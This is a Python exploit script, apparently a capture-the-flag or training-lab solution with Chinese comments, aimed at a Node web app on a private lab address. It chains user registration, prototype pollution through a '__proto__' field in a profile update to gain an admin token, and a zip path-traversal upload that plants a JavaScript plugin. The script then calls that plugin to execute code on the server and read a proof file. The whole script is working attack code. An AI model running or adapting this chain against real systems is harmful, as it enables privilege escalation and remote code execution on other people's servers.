import requests,zipfile, pathlib

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# 注册用户
def register_user(url, email, username, password):
    path = "/api/register"
    data = {"username": username, "email": email, "password": password}
    headers = {"Content-Type": "application/json"}
    code = requests.post(url + path, headers=headers, json=data, proxies=proxies).status_code
    return code

# 登录用户
def login_user(url, email, password):
    path = "/api/login"
    data = {"email": email, "password": password}
    headers = {"Content-Type": "application/json"}
    # 返回JWT{token:xxxx}
    token = requests.post(url + path, headers=headers, json=data, proxies=proxies).json().get("token")
    if not token:
        print("Something went wrong while logging in!")
        exit()
    print(f"Login successful, token: {token}")
    return token

# 修改profile获取admin权限列用原型链污染，得到新的JWT token
def get_admin_token(url, original_token, new_username, new_email):
    path = "/api/profile"
    headers = {"x-auth-token": original_token, "Content-Type": "application/json"}
    data = {"username": new_username, "email": new_email, "__proto__": {"isAdmin": "true"}}  # 随便设置一个username和email,注意每一次要更新
    response = requests.put(url + path, headers=headers, json=data, proxies=proxies)
    if response.status_code == 200:
        new_token = response.json().get("token")
        print(f"Admin token obtained: {new_token}")
        return new_token
    print("Failed to obtain admin token.")
    exit()

# 获取第一个flag使用admin_token
def get_first_flag(url, admin_token):
    path = "/admin/flag"
    headers = {"x-auth-token": admin_token}
    response = requests.get(url + path, headers=headers, proxies=proxies)
    if response.status_code == 200:
        flag = response.text
        print(f"First flag obtained: {flag}")
        return flag
    print("Failed to obtain the first flag.")
    exit()

# 创建包含路径穿越的js文件的zip包
def create_malicious_zip(target_name, zip_file):
    with open('shell.js', 'w') as f:
        f.write("""const fs = require("fs");exports.execute = async () => {const flagFilePath = '/home/student/notebook/proof.txt';if (!fs.existsSync(flagFilePath)) {return { message: "Flag file not found." };}const flag = fs.readFileSync(flagFilePath, 'utf8');return { message: `Flag: ${flag}` };};""")
    print("Malicious shell.js created.")

    real_file = pathlib.Path('shell.js')
    arc_name = f"../plugins/{target_name}.js"
    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.write(real_file, arcname=arc_name)

    print("Malicious zip created.")
    return None

# 上传zip包
def upload_zip(url, admin_token, zip_file):
    with open(zip_file, 'rb') as f:
        files = {'zipFile': (zip_file, f, 'application/zip')}#request文件上传要求三个参数，文件名，文件对象，MIME类型         
        headers = {'x-auth-token': admin_token}
        response = requests.post(f'{url}/admin/storage', headers=headers, files=files, proxies=proxies)
    if response.status_code == 200:
        print("Zip uploaded successfully.")
    else:
        print("Failed to upload zip.")

# 读取plugins穿越上传的zip中的js文件并执行
def execute_js_in_zip(url, admin_token, target_name):
    path = f"/admin/plugin?plugin={target_name}"
    headers = {"x-auth-token": admin_token}
    response = requests.get(url + path, headers=headers, proxies=proxies)
    if response.status_code == 200:
        result = response.json().get("message")
        print(f"JS executed successfully, result: {result}")
    else:
        print("Failed to execute JS.")

if __name__ == "__main__":
    url = "http://192.168.209.230:5000"
    email = "atest@example.com"
    username = "testuser25"
    password = "password"
    target_name = "fuck"  # 上传后的js文件名
    zip_file = "malicious.js.zip"
    new_username = "adminuser"
    new_email = "admin@example.com"
    # 获取admin权限的用户不知道为什么要发两次才有反应，以防外一多发一次
    new_username2 = "adminuser2"
    new_email2 = "admin2@example.com"

    # 注册用户
    register_user(url, email, username, password)

    # 登录用户
    token = login_user(url, email, password)

    # 修改profile获取admin权限
    get_admin_token(url, token, new_username, new_email) #多发一次
    admin_token = get_admin_token(url, token, new_username2, new_email2)
    # 获取第一个flag
    get_first_flag(url, admin_token)

    # 创建恶意zip包
    create_malicious_zip(target_name, zip_file)

    # 上传zip包
    upload_zip(url, admin_token, zip_file)

    # 执行zip中的js
    execute_js_in_zip(url, admin_token, target_name)